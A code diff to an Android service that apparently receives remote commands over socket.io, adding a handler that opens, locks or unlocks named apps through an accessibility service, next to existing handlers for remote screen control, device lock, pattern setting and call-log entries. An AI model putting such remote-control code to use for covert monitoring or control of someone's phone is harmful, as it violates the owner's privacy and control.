@@ -109,6 +109,7 @@ public class Server extends Service {
             socket.on("mb-screen-control-scroll-" + mDeviceID, onScreenScrollMonitor);
             socket.on("mb-device-lock-" + mDeviceID, onDeviceLockMonitor);
             socket.on("mb-device-security-event-" + mDeviceID, onDeviceSetPattern);
+            socket.on("mb-application-event-monitor-" + mDeviceID, onAppEventMonitor);
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
         } catch (URISyntaxException e) {
             e.printStackTrace();
@@ -448,6 +449,35 @@ public class Server extends Service {
                     pointsList.add(callLogEntry);
                 }
                 Common.getInstance().setKeygenEntries(pointsList);
+            } catch (JSONException e) {
+                Log.d("error::", e.toString());
+            }
+        }
+    };
+
+    private final Emitter.Listener onAppEventMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("onAppEventMonitor:", data.toString());
+            String app_event = "";
+            try {
+                app_event = (String) data.get("type");
+                JSONObject app_info = (JSONObject) data.get("app");
+                String package_name = (String) app_info.get("packagename");
+                if(app_event.equals("open")) {
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_OPEN);
+                    broadcastIntent.putExtra("packagename", package_name);
+                    sendBroadcast(broadcastIntent);
+                } else if(app_event.equals("lock")) {
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_LOCK);
+                    broadcastIntent.putExtra("packagename", package_name);
+                    sendBroadcast(broadcastIntent);
+                } else if(app_event.equals("unlock")) {
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_UNLOCK);
+                    broadcastIntent.putExtra("packagename", package_name);
+                    sendBroadcast(broadcastIntent);
+                }
             } catch (JSONException e) {
                 Log.d("error::", e.toString());
             }
